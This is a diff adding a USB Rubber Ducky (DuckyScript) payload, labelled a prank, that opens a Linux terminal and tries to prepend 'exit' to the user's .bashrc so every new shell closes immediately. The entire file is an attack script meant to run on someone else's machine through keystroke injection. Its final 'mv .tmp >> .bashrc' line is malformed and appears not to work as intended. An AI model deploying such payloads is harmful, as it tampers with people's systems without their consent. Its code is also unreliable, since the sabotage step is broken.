@@ -1,0 +1,29 @@
+REM ############################################################
+REM #                                                          #
+REM # Title        : This damn shell doesn't work, SO SAD! :C  #
+REM # Author       : Aleff                                     #
+REM # Version      : 1.0                                       #
+REM # Category     : Prank                                     #
+REM # Target       : Linux                                     #
+REM #                                                          #
+REM ############################################################
+
+
+REM Requirements:
+REM     - Nothing <3
+
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+STRING echo "exit" > .tmp
+ENTER
+DELAY 500
+STRING cat .bashrc >> .tmp
+ENTER
+DELAY 500
+STRING mv .tmp >> .bashrc
+ENTER
+DELAY 500
+ALT F4
